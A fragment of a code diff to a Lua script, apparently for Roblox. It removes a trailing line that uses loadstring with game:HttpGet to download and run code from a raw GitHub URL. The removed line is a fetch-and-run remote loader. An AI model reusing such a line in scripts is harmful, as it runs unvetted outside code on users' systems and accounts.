@@ -80,5 +80,3 @@ task.spawn(function()
         task.wait(0.5)
     end
 end)
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Imsleepyasf/wild/refs/heads/main/wish", true))()
